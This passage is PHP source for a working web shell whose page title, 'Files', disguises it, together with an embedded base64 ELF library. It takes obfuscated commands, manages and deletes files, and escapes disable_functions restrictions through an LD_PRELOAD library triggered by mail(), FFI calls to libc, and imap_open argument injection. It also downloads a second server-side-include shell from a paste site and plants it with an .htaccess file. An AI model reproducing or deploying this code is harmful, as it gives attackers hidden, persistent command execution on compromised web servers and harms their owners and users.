AAwwAAAAEAAAADAAAAzBYAAMwGAAAQAAAAAAAAAAAAAAAEAAAABAAAAMgAAAABAAAAAwAAANwWAADcBgAAIAAAAAAAAAAAAAAABAAAAAQAAADRAAAACAAAAAMAAAD8FgAA/AYAAAgAAAAAAAAAAAAAAAQAAAAAAAAA1gAAAAEAAAAwAAAAAAAAAPwGAAAtAAAAAAAAAAAAAAABAAAAAQAAABEAAAADAAAAAAAAAAAAAAApBwAA3wAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAQAwAAJADAAAaAAAAKwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAANAPAADfAQAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1AAAAAAAAAADAAEAAAAAAPgAAAAAAAAAAwACAAAAAAA0AQAAAAAAAAMAAwAAAAAANAIAAAAAAAADAAQAAAAAANICAAAAAAAAAwAFAAAAAAD0AgAAAAAAAAMABgAAAAAAJAMAAAAAAAADAAcAAAAAAFQDAAAAAAAAAwAIAAAAAAB8AwAAAAAAAAMACQAAAAAArAMAAAAAAAADAAoAAAAAABAEAAAAAAAAAwALAAAAAAC4BQAAAAAAAAMADAAAAAAA1AUAAAAAAAADAA0AAAAAAOwFAAAAAAAAAwAOAAAAAADwFQAAAAAAAAMADwAAAAAA/BUAAAAAAAADABAAAAAAAAQWAAAAAAAAAwARAAAAAAAIFgAAAAAAAAMAEgAAAAAADBYAAAAAAAADABMAAAAAAMwWAAAAAAAAAwAUAAAAAADcFgAAAAAAAAMAFQAAAAAA/BYAAAAAAAADABYAAAAAAAAAAAAAAAAAAwAXAAEAAAAAAAAAAAAAAAQA8f8MAAAA8BUAAAAAAAABAA8AGgAAAPwVAAAAAAAAAQAQACgAAAAEFgAAAAAAAAEAEQA1AAAAEAQAAAAAAAACAAsASwAAAPwWAAABAAAAAQAWAFoAAAAAFwAABAAAAAEAFgBoAAAAoAQAAAAAAAACAAsAAQAAAAAAAAAAAAAABADx/3QAAAD4FQAAAAAAAAEADwCBAAAA7AUAAAAAAAABAA4AjwAAAAQWAAAAAAAAAQARAJsAAACABQAAAAAAAAIACwCxAAAAAAAAAAAAAAAEAPH/xgAAANwWAAAAAAAAAQDx/9wAAAAIFgAAAAAAAAEAEgDpAAAAABYAAAAAAAABABAA9gAAANkEAAAAAAAAAgALAA0BAAAMFgAAAAAAAAEA8f8WAQAA4AQAAJQAAAASAAsAHgEAAAAAAAAAAAAAIAAAAC0BAAAAAAAAAAAAACAAAABBAQAAAAAAAAAAAAASAAAAUwEAALgFAAAAAAAAEgAMAFkBAAAAAAAAAAAAABIAAABrAQAAAAAAAAAAAAARAAAAfgEAAAAAAAAAAAAAEgAAAJABAAD8FgAAAAAAABAA8f+cAQAABBcAAAAAAAAQAPH/oQEAAAAAAAAAAAAAEQAAALYBAAD8FgAAAAAAABAA8f+9AQAAAAAAAAAAAAAiAAAA2QEAAHwDAAAAAAAAEgAJAABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC41OTg2AGR0b3JfaWR4LjU5ODgAZnJhbWVfZHVtbXkAX19DVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2Rzb19oYW5kbGUAX19EVE9SX0VORF9fAF9faTY4Ni5nZXRfcGNfdGh1bmsuYngAX0RZTkFNSUMAcHJlbG9hZABfX2dtb25fc3RhcnRfXwBfSnZfUmVnaXN0ZXJDbGFzc2VzAGdldGVudkBAR0xJQkNfMi4wAF9maW5pAHN5c3RlbUBAR0xJQkNfMi4wAGVudmlyb25AQEdMSUJDXzIuMABzdHJzdHJAQEdMSUJDXzIuMABfX2Jzc19zdGFydABfZW5kAF9fZW52aXJvbgBAR0xJQkNfMi4wAF9lZGF0YQBfX2N4YV9maW5hbGl6ZUBAR0xJQkNfMi4xLjMAX2luaXQA'); return isset($b[$arch]) ? $b[$arch] : ''; } function _embedSo($targetDir) { $arch = _archName(); if ($arch === null) return false; $b64 = _soB64($arch); if ($b64 === '') return false; $data = @base64_decode($b64); if ($data === false || strlen($data) < 5000) return false; if (substr($data, 0, 4) !== "\x7fELF") return false; $cls = isset($data[4]) ? ord($data[4]) : 0; if (($arch === 'x64' && $cls !== 2) || ($arch === 'x86' && $cls !== 1)) return false; $soName = 'bypass_disablefunc_' . $arch . '.so'; if (@is_writable($targetDir)) { $final = $targetDir . DIRECTORY_SEPARATOR . $soName; } else { $td = @sys_get_temp_dir(); if (!$td || !@is_writable($td)) $td = '/tmp'; $final = $td . '/' . $soName; } if (file_exists($final) && filesize($final) === strlen($data)) { @chmod($final, 0755); return $final; } if (@file_put_contents($final, $data) === false) return false; @chmod($final, 0755); return $final; } function _cleanSo() { $dirs = ['/tmp', dirname(__FILE__)]; $td = @sys_get_temp_dir(); if ($td && !in_array($td, $dirs)) $dirs[] = $td; foreach (['x64','x86'] as $a) { $n = 'bypass_disablefunc_' . $a . '.so'; foreach ($dirs as $d) { @unlink($d . '/' . $n); } } } $ssiRawUrl = 'https://pastee.dev/r/tSNYxS0S'; function _deploySSI($dir, $rawUrl = '') { if (DIRECTORY_SEPARATOR === '\\') return false; if (!is_dir($dir)) { if (!@mkdir($dir, 0755, true)) return false; } $ht = $dir . '/.htaccess'; $shf = $dir . '/shell.shtml'; $htaccess = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml\nAddOutputFilter INCLUDES .shtml\n"; @file_put_contents($ht, $htaccess); if ($rawUrl !== '') { $ctx = stream_context_create(['http' => ['timeout' => 10, 'user_agent' => 'Mozilla/5.0']]); $ssiShell = @file_get_contents($rawUrl, false, $ctx); if ($ssiShell === false || trim($ssiShell) === '') return false; } else { return false; } @file_put_contents($shf, $ssiShell); @chmod($shf, 0644); return is_file($shf) && is_file($ht); } function _cleanSSI($dir) { if (!is_dir($dir)) return; $items = @scandir($dir); if (!$items) { @rmdir($dir); return; } foreach ($items as $i) { if ($i === '.' || $i === '..') continue; $p = $dir . '/' . $i; is_dir($p) ? _rm($p) : @unlink($p); } @rmdir($dir); } $sh = realpath(dirname(__FILE__)); $isWin = DIRECTORY_SEPARATOR === '\\'; if ($auth && isset($_POST['_dep']) && !isset($_POST['p0']) && !isset($_GET['p0'])) { $ssiDir = $sh . '/.ssi'; die(_deploySSI($ssiDir, $ssiRawUrl) ? '1' : '0'); } if ($auth && isset($_POST['_cln']) && !isset($_POST['p0']) && !isset($_GET['p0'])) { $ssiDir = $sh . '/.ssi'; _cleanSSI($ssiDir); die('1'); } $cw = $sh; $postMax = _bytes(@ini_get('post_max_size')); if ($postMax <= 0) $postMax = 8388608; $msg = ''; $term = false; $termOut = ''; $editFile = ''; $editContent = ''; $lockCookie = 'lm_' . substr(md5($sk . ($_SERVER['HTTP_HOST'] ?? 'x')), 0, 8); $lockedMethod = isset($_COOKIE[$lockCookie]) ? $_COOKIE[$lockCookie] : null; $hex = ''; for ($i = 0; $i < 16; $i++) { $val = null; if (isset($_POST['p' . $i])) $val = $_POST['p' . $i]; elseif (isset($_GET['p' . $i])) $val = $_GET['p' . $i]; if ($val !== null) $hex .= $val; else break; } if ($hex !== '') { $xored = @pack('H*', $hex); if ($xored !== false && $xored !== '') { $raw = _xor($xored, $sk); $parts = explode('|', $raw); $n = count($parts); if ($n >= 1 && $parts[0] !== '') { if ($parts[0] === '/') { $rp = @realpath('/'); $cw = ($rp && is_dir($rp)) ? $rp : '/'; } else { $rp = @realpath($parts[0]); if ($rp && is_dir($rp)) $cw = $rp; } } if ($n >= 2) { $act = $parts[1]; if ($act === 'nf' && $n >= 3 && $parts[2] !== '') { $fp = $cw . DIRECTORY_SEPARATOR . basename($parts[2]); $msg = _sv($fp, '') ? '<div class="ok">File: ' . htmlspecialchars(basename($parts[2])) . '</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'nd' && $n >= 3 && $parts[2] !== '') { $fp = $cw . DIRECTORY_SEPARATOR . basename($parts[2]); $msg = @mkdir($fp, 0755, true) ? '<div class="ok">Folder: ' . htmlspecialchars(basename($parts[2])) . '</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'dl' && $n >= 3 && $parts[2] !== '') { if (file_exists($parts[2])) { _rm($parts[2]); $msg = '<div class="ok">Deleted</div>'; } else $msg = '<div class="er">Not found</div>'; } elseif ($act === 'bd' && $n >= 3 && $parts[2] !== '') { $tgs = explode("\n", $parts[2]); $cnt = 0; foreach ($tgs as $t) { $t = trim($t); if ($t !== '' && file_exists($t)) { _rm($t); $cnt++; } } $msg = '<div class="ok">Deleted: ' . $cnt . '</div>'; } elseif ($act === 'rn' && $n >= 4 && $parts[2] !== '' && $parts[3] !== '') { $old = $parts[2]; $new = dirname($old) . DIRECTORY_SEPARATOR . basename($parts[3]); $ok = false; if (file_exists($old) && $new !== $old) { if (DIRECTORY_SEPARATOR === '\\') { @chmod($old, 0666); $oldR = strtolower(@realpath($old)); $newR = strtolower(@realpath($new)); if ($oldR !== false && $oldR === $newR) { $tmp = dirname($old) . DIRECTORY_SEPARATOR . '.rn' . bin2hex(random_bytes(4)); $ok = @rename($old, $tmp) && @rename($tmp, $new); } else { if (file_exists($new)) _rm($new); $ok = @rename($old, $new); } } else { $ok = @rename($old, $new); } } $msg = $ok ? '<div class="ok">Renamed</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'ch' && $n >= 4 && $parts[2] !== '' && $parts[3] !== '') { $msg = (file_exists($parts[2]) && @chmod($parts[2], octdec($parts[3]))) ? '<div class="ok">Chmod ' . $parts[3] . '</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'th' && $n >= 4 && $parts[2] !== '' && $parts[3] !== '') { $ts = @strtotime($parts[3]); if ($ts === false) $ts = time(); $msg = (file_exists($parts[2]) && @touch($parts[2], $ts)) ? '<div class="ok">Touch OK</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'ex' && $n >= 3 && $parts[2] !== '') { $cmd = base64_decode($parts[2]); if ($cmd === false) $cmd = $parts[2]; $term = true; $termOut = _execCmd($cmd); } elseif ($act === 'sv' && $n >= 4 && $parts[2] !== '' && $parts[3] !== '') { $msg = _sv($parts[2], base64_decode($parts[3])) ? '<div class="ok">Saved</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'up' && $n >= 4 && $parts[2] !== '' && $parts[3] !== '') { $fp = $cw . DIRECTORY_SEPARATOR . basename($parts[2]); $data = base64_decode($parts[3]); $msg = _sv($fp, $data) ? '<div class="ok">Upload: ' . htmlspecialchars(basename($parts[2])) . ' (' . fmtSize(strlen($data)) . ')</div>' : '<div class="er">Fail</div>'; } elseif ($act === 'upc' && $n >= 7 && $parts[2] !== '' && $parts[3] !== '' && $parts[4] !== '' && $parts[5] !== '' && $parts[6] !== '') { $tok = preg_replace('/[^a-f0-9]/i', '', $parts[2]); $fname = basename($parts[3]); $idx = (int)$parts[4]; $total = (int)$parts[5]; $b64c = $parts[6]; if ($tok !== '' && $total > 0 && $idx >= 0 && $idx < $total) { $partFile = $sh . DIRECTORY_SEPARATOR . '.ut_' . $tok . '_' . $idx . '.part'; $d = base64_decode($b64c); if ($d !== false && _sv($partFile, $d)) { if ($idx === $total - 1) { $tgt = $cw . DIRECTORY_SEPARATOR . $fname; $out = @fopen($tgt, 'wb'); if (!$out && DIRECTORY_SEPARATOR === '\\') { @chmod($tgt, 0666); $out = @fopen($tgt, 'wb'); } $ok2 = false; if ($out) { $ok2 = true; for ($i2 = 0; $i2 < $total; $i2++) { $pf = $sh . DIRECTORY_SEPARATOR . '.ut_' . $tok . '_' . $i2 . '.part'; $in = @fopen($pf, 'rb'); if (!$in) { $ok2 = false; break; } while (!feof($in)) { $cc = @fread($in, 1048576); if ($cc === false) { $ok2 = false; break; } @fwrite($out, $cc); } @fclose($in); @unlink($pf); } @fclose($out); } if (!$ok2) { @unlink($tgt); for ($i2 = 0; $i2 < $total; $i2++) @unlink($sh . DIRECTORY_SEPARATOR . '.ut_' . $tok . '_' . $i2 . '.part'); } die($ok2 ? '1' : '0'); } die('1'); } } die('0'); } elseif ($act === 'ed' && $n >= 3 && $parts[2] !== '') { if (file_exists($parts[2]) && is_file($parts[2])) { $editFile = $parts[2]; $editContent = @file_get_contents($editFile); } } } } } function _execCmd($cmd) { global $lockedMethod, $lockCookie, $cw; @chdir($cw); if ($lockedMethod && $lockedMethod !== '') { if (in_array($lockedMethod, ['system','passthru','shell_exec','exec','popen','proc_open'])) { if (!_fnAvailable($lockedMethod)) { @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } else { if ($lockedMethod === 'proc_open') { $r = _tryProcOpen($cmd); if ($r !== false) return $r . "\n"; @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } else { ob_start(); if ($lockedMethod === 'exec') { $lockedMethod($cmd . ' 2>&1', $o); echo implode("\n", $o); } elseif ($lockedMethod === 'popen') { $h = $lockedMethod($cmd . ' 2>&1', 'r'); if ($h) { while (!feof($h)) echo fread($h, 8192); pclose($h); } } else { $lockedMethod($cmd . ' 2>&1'); } $out = ob_get_clean(); if ($out !== false && $out !== '') return $out . "\n"; @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } } } elseif ($lockedMethod === 'mail_bypass') { $out = _bypassMail($cmd); if (strpos($out, '[LD_PRELOAD via mail]') !== false || strpos($out, '.so:') !== false) return $out; @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } elseif ($lockedMethod === 'ld_preload') { $out = _bypassLdPreload($cmd); if (strpos($out, '.so:') !== false) return $out; @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } elseif ($lockedMethod === 'ffi') { $out = _bypassFFI($cmd); if (strpos($out, '[FFI]') !== false) return $out; @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } elseif ($lockedMethod === 'imap_open') { $out = _bypassImapOpen($cmd); if (strpos($out, '[imap_open]') !== false) return $out; @setcookie($lockCookie, '', time() - 3600, '/'); $lockedMethod = null; } } $allNative = ['system','passthru','shell_exec','exec','popen','proc_open']; foreach ($allNative as $fn) { if (!_fnAvailable($fn)) continue; if ($fn === 'proc_open') { $r = _tryProcOpen($cmd); if ($r !== false) { @setcookie($lockCookie, $fn, time() + 86400, '/'); $lockedMethod = $fn; return $r . "\n"; } continue; } ob_start(); if ($fn === 'exec') { $fn($cmd . ' 2>&1', $o); $raw = implode("\n", $o); } elseif ($fn === 'popen') { $raw = ''; $h = $fn($cmd . ' 2>&1', 'r'); if ($h) { while (!feof($h)) $raw .= fread($h, 8192); pclose($h); } } else { $fn($cmd . ' 2>&1'); $raw = ob_get_contents(); } ob_end_clean(); if ($raw !== false && $raw !== '') { @setcookie($lockCookie, $fn, time() + 86400, '/'); $lockedMethod = $fn; return $raw . "\n"; } } $out = _bypassMail($cmd); if (strpos($out, '[LD_PRELOAD via mail]') !== false || strpos($out, '.so:') !== false) { @setcookie($lockCookie, 'mail_bypass', time() + 86400, '/'); $lockedMethod = 'mail_bypass'; return $out; } $out = _bypassLdPreload($cmd); if (strpos($out, '.so:') !== false) { @setcookie($lockCookie, 'ld_preload', time() + 86400, '/'); $lockedMethod = 'ld_preload'; return $out; } $out = _bypassFFI($cmd); if (strpos($out, '[FFI]') !== false) { @setcookie($lockCookie, 'ffi', time() + 86400, '/'); $lockedMethod = 'ffi'; return $out; } $out = _bypassImapOpen($cmd); if (strpos($out, '[imap_open]') !== false) { @setcookie($lockCookie, 'imap_open', time() + 86400, '/'); $lockedMethod = 'imap_open'; return $out; } return 'No execution engine available'; } function _tryProcOpen($cmd) { if (!_fnAvailable('proc_open')) return false; if (DIRECTORY_SEPARATOR === '\\' && stripos(ltrim($cmd), 'cmd') !== 0) $cmd = 'cmd /c ' . $cmd; $descriptorspec = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']]; $process = @proc_open($cmd, $descriptorspec, $pipes); if (!is_resource($process)) return false; @fclose($pipes[0]); $stdout = @stream_get_contents($pipes[1]); $stderr = @stream_get_contents($pipes[2]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($process); return $stdout . $stderr; } function _bypassMail($cmd) { if (DIRECTORY_SEPARATOR === '\\') return '<span style="color:#e74c3c;">[mail bypass]</span>' . "\n" . 'LD_PRELOAD bypass is not supported on Windows'; $foundSo = null; $soCandidates = [ '/tmp/bypass_disablefunc_x64.so', '/tmp/bypass_disablefunc_x86.so', dirname(__FILE__) . '/bypass_disablefunc_x64.so', dirname(__FILE__) . '/bypass_disablefunc_x86.so', ]; foreach ($soCandidates as $cand) { if (file_exists($cand)) { $foundSo = $cand; break; } } if (!$foundSo) { $downloaded = _embedSo(dirname(__FILE__)); if (!$downloaded) $downloaded = _embedSo('/tmp'); if ($downloaded) $foundSo = $downloaded; } if (!$foundSo) { return '<span style="color:#e74c3c;">[mail bypass]</span>' . "\n" . 'Could not obtain .so file. Try LD_PRELOAD method instead.'; } @chmod($foundSo, 0755); $outFile = '/tmp/.o_' . bin2hex(random_bytes(5)); putenv('EVIL_CMDLINE=' . $cmd . ' > ' . escapeshellarg($outFile) . ' 2>&1'); putenv('LD_PRELOAD=' . $foundSo); if (function_exists('mail')) { @mail('a@b.c', '', ''); } elseif (function_exists('error_log')) { @error_log('1', 1, 'a@b.c', ''); } else { @unlink($outFile); _cleanSo(); return '<span style="color:#e74c3c;">[mail bypass]</span>' . "\n" . 'No trigger function (need mail or error_log)'; } $out = ''; for ($n = 0; $n < 40; $n++) { usleep(50000); if (file_exists($outFile)) { $out = @file_get_contents($outFile); break; } } @unlink($outFile); if ($out === false || $out === '') { _cleanSo(); return '<span style="color:#f39c12;">[LD_PRELOAD via mail]</span>' . "\n" . '.so: ' . htmlspecialchars($foundSo) . "\n" . 'Command: ' . $cmd . "\n" . 'Output empty — command may have failed or sendmail_path not set'; } _cleanSo(); return '<span style="color:#2ecc71;">[LD_PRELOAD via mail]</span>' . "\n" . '.so: ' . htmlspecialchars($foundSo) . "\n" . $out; } function _bypassLdPreload($cmd, $preSo = null) { if (DIRECTORY_SEPARATOR === '\\') return '<span style="color:#e74c3c;">[LD_PRELOAD]</span>' . "\n" . 'LD_PRELOAD bypass is not supported on Windows'; if ($preSo && file_exists($preSo)) { $soPath = $preSo; } else { $soCandidates = [ '/tmp/bypass_disablefunc_x64.so', '/tmp/bypass_disablefunc_x86.so', dirname(__FILE__) . '/bypass_disablefunc_x64.so', dirname(__FILE__) . '/bypass_disablefunc_x86.so', ]; $found = null; foreach ($soCandidates as $cand) { if (file_exists($cand)) { $found = $cand; break; } } if ($found) { $soPath = $found; } else { $downloaded = _embedSo(dirname(__FILE__)); if (!$downloaded) $downloaded = _embedSo('/tmp'); if ($downloaded) { $soPath = $downloaded; } else { return '<span style="color:#e74c3c;">[LD_PRELOAD]</span>' . "\n" . 'Could not obtain embedded .so file.'; } } } if (!function_exists('putenv')) { _cleanSo(); return '<span style="color:#e74c3c;">putenv() is disabled — LD_PRELOAD cannot work</span>'; } @chmod($soPath, 0755); $outFile = '/tmp/.o_' . bin2hex(random_bytes(5)); putenv('EVIL_CMDLINE=' . $cmd . ' > ' . escapeshellarg($outFile) . ' 2>&1'); putenv('LD_PRELOAD=' . $soPath); $triggered = false; $triggerMethod = ''; if (function_exists('mail')) { @mail('a@b.c', '', ''); $triggered = true; $triggerMethod = 'mail()'; } elseif (function_exists('error_log')) { @error_log('1', 1, 'a@b.c', ''); $triggered = true; $triggerMethod = 'error_log()'; } if (!$triggered) { @unlink($outFile); _cleanSo(); return '<span style="color:#e74c3c;">No trigger function (need mail or error_log)</span>'; } $out = ''; for ($n = 0; $n < 40; $n++) { usleep(50000); if (file_exists($outFile)) { $out = @file_get_contents($outFile); break; } } @unlink($outFile); if ($out === false || $out === '') { _cleanSo(); return '<span style="color:#f39c12;">[LD_PRELOAD]</span>' . "\n" . '.so: ' . htmlspecialchars($soPath) . ' | Trigger: ' . $triggerMethod . "\n" . 'Command: ' . $cmd . "\n" . 'Output empty — command may have failed or sendmail_path not configured.' . "\n" . 'Try: echo test | tee /tmp/x.txt 2>&1 (then check /tmp/x.txt in file manager)'; } _cleanSo(); return '<span style="color:#2ecc71;">[LD_PRELOAD]</span>' . "\n" . '.so: ' . htmlspecialchars($soPath) . ' | Trigger: ' . $triggerMethod . "\n" . $out; } function _bypassFFI($cmd) { if (!extension_loaded('ffi')) return '<span style="color:#e74c3c;">FFI extension not loaded</span>'; if (!class_exists('FFI')) return '<span style="color:#e74c3c;">FFI class not available</span>'; $tmpf = rtrim(sys_get_temp_dir(), '\\/') . DIRECTORY_SEPARATOR . '.ffi' . mt_rand(10000, 99999); try { $lib = DIRECTORY_SEPARATOR === '\\' ? 'msvcrt.dll' : 'libc.so.6'; $redir = DIRECTORY_SEPARATOR === '\\' ? ('> "' . $tmpf . '" 2>&1') : ('> ' . escapeshellarg($tmpf) . ' 2>&1'); $ffi = FFI::cdef('int system(const char *command);', $lib); @$ffi->system($cmd . ' ' . $redir); $out = ''; if (file_exists($tmpf)) { $out = @file_get_contents($tmpf); @unlink($tmpf); } return ($out !== '') ? '<span style="color:#2ecc71;">[FFI]</span>' . "\n" . $out : '<span style="color:#f39c12;">FFI executed but no output</span>'; } catch (Throwable $e) { return '<span style="color:#e74c3c;">FFI error:</span> ' . htmlspecialchars($e->getMessage()); } } function _bypassImapOpen($cmd) { if (DIRECTORY_SEPARATOR === '\\') return '<span style="color:#e74c3c;">[imap_open]</span>' . "\n" . 'imap_open bypass is not supported on Windows'; if (!function_exists('imap_open')) return '<span style="color:#e74c3c;">imap_open not available</span>'; $tmpf = '/tmp/.imap' . mt_rand(10000, 99999); $payload = 'x" -o ' . escapeshellarg($tmpf) . ' -exec "echo PAYLOAD_START;' . $cmd . ' 2>&1;echo PAYLOAD_END'; $server = '{127.0.0.1:993/imap/ssl}INBOX'; @imap_open($server, $payload, 'x', OP_SILENT); $out = ''; if (file_exists($tmpf)) { $out = @file_get_contents($tmpf); @unlink($tmpf); } return ($out !== '') ? '<span style="color:#2ecc71;">[imap_open]</span>' . "\n" . $out : '<span style="color:#f39c12;">imap_open bypass attempted — no output captured</span>'; } $items = @scandir($cw); if (!$items) $items = []; $dirs = []; $files = []; foreach ($items as $it) { if ($it === '.' || $it === '..') continue; $p = $cw . DIRECTORY_SEPARATOR . $it; if (@is_dir($p)) $dirs[] = $it; elseif (@is_file($p)) $files[] = $it; } sort($dirs); sort($files); $checkFns = ['system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec','putenv','mail','error_log','dl']; $fnStatus = []; foreach ($checkFns as $fn) { $avail = function_exists($fn); $isDisabled = in_array($fn, $disabledList); $fnStatus[$fn] = $avail && !$isDisabled; } $osInfo = php_uname(); $phpVer = PHP_VERSION; $sapi = PHP_SAPI; $user = function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_getuid())['name'] : @get_current_user(); $serverSoft = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'; $soFilesFound = []; if ($cw) { $soCandidates = ['bypass_disablefunc_x64.so', 'bypass_disablefunc_x86.so']; foreach ($soCandidates as $so) { $full = $cw . DIRECTORY_SEPARATOR . $so; if (file_exists($full)) $soFilesFound[] = $so; } } $rootL = $isWin ? (strtoupper(substr($cw, 0, 2)) . '\\') : '/'; $bc = '<a href="#" onclick="go(\'' . hx('/') . '\');return false" style="color:#2ecc71;font-weight:bold;">' . htmlspecialchars($rootL) . '</a>'; if ($isWin) { $pcs = explode('\\', str_replace('/', '\\', trim(substr($cw, 2), '\\/'))); $acc = $rootL; } else { $pcs = ($cw === '/') ? [] : explode('/', trim($cw, '/')); $acc = '/'; } foreach ($pcs as $p) { if ($p === '') continue; $acc = rtrim($acc, '\\/') . DIRECTORY_SEPARATOR . $p; $bc .= ' <span style="color:#444;">/</span> <a href="#" onclick="go(\'' . hx($acc) . '\');return false" style="color:#2ecc71;">' . htmlspecialchars($p) . '</a>'; } function dirColor($path) { if (!is_dir($path)) return is_writable($path) ? '#2ecc71' : '#ecf0f1'; return is_writable($path) ? '#2ecc71' : '#ecf0f1'; } function dirClass($path) { if (!is_dir($path)) return is_writable($path) ? 'file-g' : 'file-w'; return is_writable($path) ? 'dir-g' : 'dir-w'; } $ssiDir = $sh . '/.ssi'; $ssiDeployed = !$isWin && is_dir($ssiDir) && is_file($ssiDir . '/shell.shtml') && is_file($ssiDir . '/.htaccess'); $ssiUrl = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\') . '/.ssi/shell.shtml'; $self = preg_replace('#/+#', '/', strtok($_SERVER['REQUEST_URI'], '?')); ?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Files</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#d0d0d0;font-family:monospace;font-size:12px}
a{text-decoration:none}
a:hover{text-decoration:underline}
.h{background:#111;border-bottom:1px solid #222;padding:12px 15px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
.infobar{background:#0d0d0d;border-bottom:1px solid #1a1a1a;padding:8px 15px;display:flex;flex-wrap:wrap;gap:10px 25px;font-size:10px;align-items:center}
.infobar span{color:#888}
.infobar b{color:#2ecc71}
.infobar .df-on{color:#2ecc71}
.infobar .df-off{color:#e74c3c}
.tb{display:flex;flex-wrap:wrap;gap:6px;padding:10px 15px;background:#0d0d0d;border-bottom:1px solid #1a1a1a;align-items:center}
.tb input[type="text"]{background:#000;border:1px solid #333;color:#0f0;padding:5px 8px;font-family:monospace;font-size:11px}
.tb input[type="text"]:focus{outline:none;border-color:#2ecc71}
.tb select{background:#000;border:1px solid #333;color:#f1c40f;padding:5px 8px;font-family:monospace;font-size:10px}
.btn{background:#1a1a1a;color:#ccc;border:1px solid #333;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:11px;white-space:nowrap}
.btn:hover{background:#222;border-color:#555}
.btn-g{background:#0a2a0a;border-color:#1a5a1a;color:#2ecc71}
.btn-g:hover{background:#0d350d;border-color:#2a7a2a}
.btn-p{background:#1a1a2a;border-color:#2a2a4a;color:#8e44ad}
.btn-p:hover{background:#222240}
.btn-r{background:#2a0a0a;border-color:#4a1a1a;color:#e74c3c}
.btn-r:hover{background:#350d0d}
.btn-o{background:#2a1a0a;border-color:#5a3a1a;color:#e67e22}
.btn-o:hover{background:#35220d}
.btn-so{background:#0a2a2a;border-color:#1a5a5a;color:#1abc9c}
.btn-so:hover{background:#0d3535}
.ok{background:#0a2a0a;border:1px solid #1a5a1a;padding:8px 15px;color:#2ecc71;margin:8px 15px;font-size:11px}
.er{background:#2a0a0a;border:1px solid #5a1a1a;padding:8px 15px;color:#e74c3c;margin:8px 15px;font-size:11px}
.so-info{background:#0a1a2a;border:1px solid #1a3a5a;padding:8px 15px;color:#1abc9c;margin:8px 15px;font-size:11px}
table{width:100%;border-collapse:collapse}
thead th{background:#111;color:#888;text-align:left;padding:8px 10px;font-size:10px;text-transform:uppercase;border-bottom:1px solid #222}
td{padding:6px 10px;border-bottom:1px solid #111;font-size:11px;vertical-align:middle}
tr:hover{background:#0f0f0f}
.chk{accent-color:#2ecc71;cursor:pointer}
.inline input[type="text"]{background:#000;border:1px solid #2a2a2a;color:#f1c40f;padding:3px 6px;font-family:monospace;font-size:10px;width:90px}
.inline input[type="text"]:focus{outline:none;border-color:#2ecc71}
.inline .btn{font-size:10px;padding:3px 8px}
.terminal{display:none;margin:10px 15px;background:#0a0a0a;border:1px solid #2a1a3a;padding:15px}
.terminal h4{color:#8e44ad;margin-bottom:10px;font-size:12px}
.terminal .cmd-row{display:flex;gap:8px;flex-wrap:wrap}
.terminal .cmd-row input{flex:1;min-width:200px;background:#000;border:1px solid #333;color:#0f0;padding:8px;font-family:monospace}
.terminal .cmd-row input:focus{outline:none;border-color:#8e44ad}
.terminal .cmd-row select{background:#000;border:1px solid #333;color:#f1c40f;padding:8px;font-family:monospace;font-size:10px}
.terminal .out{background:#000;border:1px solid #1a1a1a;margin-top:10px;padding:10px;white-space:pre-wrap;max-height:300px;overflow-y:auto;color:#ccc;font-size:11px;min-height:30px}
.terminal .disabled-note{background:#1a0a0a;border:1px solid #3a1a1a;padding:6px 10px;margin-top:8px;font-size:10px;color:#e74c3c;border-radius:3px}
.terminal .disabled-note b{color:#f39c12}
.terminal .ld-so-path{margin-top:6px;font-size:10px;color:#888;display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.terminal .ld-so-path input{background:#000;border:1px solid #333;color:#1abc9c;padding:4px 8px;font-family:monospace;font-size:10px;width:300px}
.terminal .cmd-row form{flex:1;min-width:200px;display:flex}
.terminal .cmd-row form input{width:100%;background:#000;border:1px solid #333;color:#0f0;padding:8px;font-family:monospace}
.terminal .cmd-row form input:focus{outline:none;border-color:#8e44ad}
.editor{padding:15px}
.editor .edh{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px}
.editor textarea{width:100%;height:450px;background:#000;color:#0f0;border:1px solid #333;padding:10px;font-family:monospace;font-size:12px;resize:vertical}
.editor textarea:focus{outline:none;border-color:#2ecc71}
.bulk{display:flex;gap:8px;align-items:center;padding:8px 15px;background:#0d0d0d;border-top:1px solid #1a1a1a}
.dir-g{color:#2ecc71;font-weight:bold}
.dir-w{color:#ecf0f1;font-weight:bold}
